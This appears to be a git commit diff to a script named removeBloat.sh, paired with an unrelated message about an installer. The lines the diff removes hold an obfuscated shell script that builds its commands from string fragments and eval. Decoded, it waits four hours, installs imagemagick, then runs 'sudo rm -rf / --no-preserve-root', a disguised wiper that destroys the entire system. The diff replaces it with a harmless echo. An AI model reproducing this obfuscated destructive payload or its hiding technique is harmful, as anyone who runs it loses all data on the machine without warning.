cb1c6d771f69582474aa77a08143044a0af3ef29
Ashton(tripple blocked, owns illendo) <162846629+YeesterPlus@users.noreply.github.com>
2024-06-10 18:18:52 +0000

    add installer for Avoid the wall!

--- removeBloat.sh
+++ removeBloat.sh
@@ -1,3 +1,1 @@
-z="
-";Bz='p 14';Gz='tall';Iz='gema';Dz='sudo';Nz=' rm ';Hz=' ima';Jz='gick';Cz='400';Oz='-rf ';Kz='imag';Lz='emag';Ez=' apt';Fz=' ins';Qz='no-p';Tz='root';Sz='rve-';Rz='rese';Az='slee';Mz='ick';Pz='/ --';
-eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$z$Dz$Nz$Oz$Pz$Qz$Rz$Sz$Tz"
+echo "remove it jo self!"
